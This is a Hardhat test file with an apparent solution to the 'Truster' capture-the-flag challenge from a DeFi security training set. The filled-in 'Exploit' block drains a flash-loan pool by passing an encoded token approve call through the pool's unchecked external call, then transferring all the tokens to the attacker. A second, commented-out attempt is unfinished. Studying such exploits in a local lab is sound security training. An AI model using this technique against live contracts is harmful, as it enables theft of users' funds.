const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        console.log("before"); 
        console.log(await this.token.balanceOf(this.pool.address)); 
        console.log(await this.token.balanceOf(attacker.address)); 

        const ABI = ["function approve(address, uint256)"];
        const interface = new ethers.utils.Interface(ABI);
        const data = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);

        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);          // token.approve() : lending pool -> attacker
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);

        console.log("after"); 
        console.log(await this.token.balanceOf(this.pool.address)); 
        console.log(await this.token.balanceOf(attacker.address)); 
    });
    // it('Exploit', async function () {
    //     /** CODE YOUR EXPLOIT HERE  */
    //     const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
    //     const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address); 
        
    //     const amount = 0;
    //     const borrower = attacker.address;
    //     const target = this.token.address;

    //     const abi = ["function approve(address spender, uint256 amount)"]
    //     const iface = new ethers.utils.interface(abi);
    //     const data = iface.encodeFunctionData("approve", [attackContract.address,])
        
    // });


    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

